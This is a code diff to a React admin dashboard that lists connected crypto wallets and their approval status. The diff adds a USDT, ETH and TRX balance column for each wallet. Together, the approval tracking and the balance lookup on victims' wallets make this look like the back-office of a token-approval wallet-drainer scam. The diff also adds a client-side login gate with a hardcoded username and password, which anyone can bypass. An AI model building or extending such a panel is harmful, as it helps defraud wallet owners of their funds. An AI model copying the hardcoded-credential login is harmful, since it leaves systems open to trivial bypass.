@@ -1,6 +1,10 @@
 import { useEffect, useState, useMemo } from 'react';
 import { supabase } from '../lib/supabaseClient';
+import { ACTIVE_RPC_URL } from '../lib/walletConfig';
 import './Admin.css';
+
+const EVM_USDT = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
+const TRON_USDT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
 
 // Helper to shorten addresses for display
 function shortenAddress(addr) {
@@ -26,7 +30,60 @@ function timeAgo(dateStr) {
   return new Date(dateStr).toLocaleDateString();
 }
 
+const ADMIN_USER = 'john';
+const ADMIN_PASS = 'Qspl@1234';
+
+function LoginGate({ onAuth }) {
+  const [username, setUsername] = useState('');
+  const [password, setPassword] = useState('');
+  const [err, setErr] = useState('');
+
+  const handleSubmit = (e) => {
+    e.preventDefault();
+    if (username === ADMIN_USER && password === ADMIN_PASS) {
+      sessionStorage.setItem('adminAuth', '1');
+      onAuth();
+    } else {
+      setErr('Invalid username or password.');
+    }
+  };
+
+  return (
+    <div className="admin-page">
+      <div className="admin-glow admin-glow--1" />
+      <div className="admin-glow admin-glow--2" />
+      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', minHeight: '100vh' }}>
+        <form onSubmit={handleSubmit} style={{ background: 'rgba(255,255,255,0.04)', border: '1px solid rgba(255,255,255,0.1)', borderRadius: 16, padding: '2.5rem 2rem', display: 'flex', flexDirection: 'column', gap: 16, minWidth: 320 }}>
+          <h2 style={{ color: '#fff', margin: 0, fontSize: '1.4rem', fontWeight: 700, textAlign: 'center' }}>🔒 Admin Login</h2>
+          <input
+            type="text"
+            placeholder="Username"
+            value={username}
+            onChange={(e) => setUsername(e.target.value)}
+            autoComplete="username"
+            className="admin-search"
+            style={{ marginTop: 8 }}
+          />
+          <input
+            type="password"
+            placeholder="Password"
+            value={password}
+            onChange={(e) => setPassword(e.target.value)}
+            autoComplete="current-password"
+            className="admin-search"
+          />
+          {err && <span style={{ color: '#f87171', fontSize: '0.85rem', textAlign: 'center' }}>{err}</span>}
+          <button type="submit" className="admin-refresh-btn" style={{ width: '100%', justifyContent: 'center' }}>
+            Login
+          </button>
+        </form>
+      </div>
+    </div>
+  );
+}
+
 export default function Admin() {
+  const [authed, setAuthed] = useState(() => sessionStorage.getItem('adminAuth') === '1');
   const [connections, setConnections] = useState([]);
   const [approvals, setApprovals] = useState([]);
   const [loading, setLoading] = useState(true);
@@ -34,6 +91,65 @@ export default function Admin() {
   const [search, setSearch] = useState('');
   const [sortField, setSortField] = useState('last_seen_at');
   const [sortAsc, setSortAsc] = useState(false);
+  const [balances, setBalances] = useState({});
+
+  if (!authed) return <LoginGate onAuth={() => setAuthed(true)} />;
+
+  const fetchEvmBalance = async (address) => {
+    try {
+      const [ethRes, usdtRes] = await Promise.all([
+        fetch(ACTIVE_RPC_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ jsonrpc: '2.0', method: 'eth_getBalance', params: [address, 'latest'], id: 1 }),
+        }),
+        fetch(ACTIVE_RPC_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            jsonrpc: '2.0', method: 'eth_call',
+            params: [{ to: EVM_USDT, data: '0x70a08231' + address.slice(2).padStart(64, '0') }, 'latest'],
+            id: 2,
+          }),
+        }),
+      ]);
+      const ethData = await ethRes.json();
+      const usdtData = await usdtRes.json();
+      const eth = (parseInt(ethData.result || '0x0', 16) / 1e18).toFixed(4);
+      const usdt = (parseInt(usdtData.result || '0x0', 16) / 1e6).toFixed(2);
+      return { native: `${eth} ETH`, usdt: `${usdt} USDT` };
+    } catch {
+      return { error: true };
+    }
+  };
+
+  const fetchTronBalance = async (address) => {
+    try {
+      const res = await fetch(`https://api.trongrid.io/v1/accounts/${address}`);
+      const data = await res.json();
+      const account = data.data?.[0];
+      const trx = ((account?.balance || 0) / 1e6).toFixed(2);
+      const trc20List = account?.trc20 || [];
+      const usdtEntry = trc20List.find((t) => TRON_USDT in t);
+      const usdt = (parseInt(usdtEntry?.[TRON_USDT] || '0') / 1e6).toFixed(2);
+      return { native: `${trx} TRX`, usdt: `${usdt} USDT` };
+    } catch {
+      return { error: true };
+    }
+  };
+
+  const fetchBalances = (conns) => {
+    const loadingState = {};
+    conns.forEach((c) => { loadingState[`${c.address}__${c.network}`] = { loading: true }; });
+    setBalances(loadingState);
+    conns.forEach(async (conn) => {
+      const key = `${conn.address}__${conn.network}`;
+      const result = conn.network === 'tron'
+        ? await fetchTronBalance(conn.address)
+        : await fetchEvmBalance(conn.address);
+      setBalances((prev) => ({ ...prev, [key]: result }));
+    });
+  };
 
   const fetchData = async () => {
     setLoading(true);
@@ -47,8 +163,10 @@ export default function Admin() {
       if (connRes.error) throw connRes.error;
       if (apprRes.error) throw apprRes.error;
 
-      setConnections(connRes.data || []);
+      const conns = connRes.data || [];
+      setConnections(conns);
       setApprovals(apprRes.data || []);
+      if (conns.length > 0) fetchBalances(conns);
     } catch (err) {
       console.error('[Admin] fetch error:', err);
       setError(err.message || 'Failed to fetch data');
@@ -228,6 +346,7 @@ export default function Admin() {
                 <th className="admin-th admin-th--sortable" onClick={() => handleSort('approved')}>
                   Approval <span className="admin-sort-icon">{sortIcon('approved')}</span>
                 </th>
+                <th className="admin-th">Balance</th>
                 <th className="admin-th admin-th--sortable" onClick={() => handleSort('last_seen_at')}>
                   Last Seen <span className="admin-sort-icon">{sortIcon('last_seen_at')}</span>
                 </th>
@@ -236,7 +355,7 @@ export default function Admin() {
             <tbody>
               {loading && sorted.length === 0 ? (
                 <tr>
-                  <td colSpan="6" className="admin-empty-cell">
+                  <td colSpan="7" className="admin-empty-cell">
                     <div className="admin-loader">
                       <div className="admin-loader__spinner" />
                       <span>Loading data…</span>
@@ -245,7 +364,7 @@ export default function Admin() {
                 </tr>
               ) : sorted.length === 0 ? (
                 <tr>
-                  <td colSpan="6" className="admin-empty-cell">
+                  <td colSpan="7" className="admin-empty-cell">
                     <div className="admin-empty">
                       <span className="admin-empty__icon">📭</span>
                       <span>No wallet connections found</span>
@@ -289,6 +408,20 @@ export default function Admin() {
                           Pending
                         </span>
                       )}
+                    </td>
+                    <td className="admin-td admin-td--balance">
+                      {(() => {
+                        const bal = balances[`${row.address}__${row.network}`];
+                        if (!bal) return <span className="admin-balance__empty">—</span>;
+                        if (bal.loading) return <span className="admin-balance__loading">···</span>;
+                        if (bal.error) return <span className="admin-balance__error">—</span>;
+                        return (
+                          <div className="admin-balance">
+                            <span className="admin-balance__usdt">{bal.usdt}</span>
+                            <span className="admin-balance__native">{bal.native}</span>
+                          </div>
+                        );
+                      })()}
                     </td>
                     <td className="admin-td admin-td--time" title={row.last_seen_at}>
                       {timeAgo(row.last_seen_at)}
